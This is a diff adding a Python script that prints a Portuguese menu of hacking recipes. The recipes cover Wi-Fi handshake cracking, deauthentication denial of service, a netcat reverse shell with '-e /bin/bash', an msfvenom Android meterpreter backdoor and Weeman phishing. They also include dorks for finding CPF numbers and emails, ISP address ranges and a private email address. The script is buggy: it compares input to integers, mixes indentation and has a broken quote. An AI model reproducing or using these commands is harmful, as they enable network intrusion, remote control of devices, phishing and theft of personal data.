@@ -1,0 +1,88 @@
+#!/usr/bin/python 
+
+
+print('.................')
+print('Bem vindo Sr. Ice')
+print('.................')
+print('Menu interativo')
+print('.................')
+print('0-bruteforce')
+print('.................')
+print('1-dos na rede')
+print('.................')
+print('2-injetar pacotes na rede')
+print('..................')
+print('3-listener do netcat')
+print('..................')
+print('4-achar dados de sites')
+print('..................')
+print('5-ip de provedores')
+print('..................')
+print('6-material para falha xss')
+print('..................')
+print('7-filtro do wireshark')
+print('..................')
+print('8-ver porta aberta')
+print('..................')
+print('9-dork de cpf e email')
+print('..................')
+print('10-backdoor para android')
+print('..................')
+print('11-email do especialista em linux')
+print('..................')
+print('12-pishing com weeman')
+print('..................')
+
+op = input()
+print(op)
+
+if op == 0:
+	print('airmon-ng check kill')
+        print('airmon-ng start wlan0')
+        print('airodump-ng wlan0mon')
+        print('airodump-ng -c [canal] --bssid [o bssid] -w [o nome] wlan0mon')
+        print('HANDSHAK')
+        print('aireplay-ng -0 -10 -a [bssid] -c wlan0mon')
+        print('ls')
+        print('airmon-ng [o arquivo .cap]')
+        print('crunch 10 10 [letras e numeros] | aircrack-ng -w - -b [bssid] [o arquivo .cap]')
+if op == 1:
+	print('airmon-ng start wlan0')
+        print('airodump-ng wlan0mon')
+        print('aireplay-ng -0 10 -a [bssid] wlan0mon')
+if op == 2:
+        print('airmon-ng start wlan0')
+        print('airodump-ng wlan0mon')
+        print('aireplay-ng -3 -b [bssid] wlan0mon')
+if op == 3:
+        print('nc -lvp [porta]')
+        print('nc [ip] [porta]')
+        print('EXECUTAR COMANDOS VIA LISTENER PELA PORTA')
+        print('nc -lvp [porta]')
+        print('nc [ip] [porta] -e /bin/bash')
+if op == 4:
+        print('nslookup')
+        print('set type=mx')
+        print('o site')
+        print('thevaster -d [site] -l 500 -b all')
+        print('whois [o site]')
+if op == 5:
+        print('OI - 189.80.241.0-255')
+        print('NET - 177.180.193.0-255')
+if op == 6:
+        print('<script>alert('')</script>')
+if op == 7:
+        print('urlencod-form.key ')
+if op == 8:
+        print('nc [ip] [porta]')
+if op == 9:
+        print('intext.email intext.cpf filetype.pdf')
+if op == 10:
+        print('msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT= -R [nome]')
+if op == 11:
+        print('baptista@gmail.com')
+if op == 12:
+        print('cd weeman')
+        print('python2 weeman.py')
+        print('set url + o site')
+        print('run')
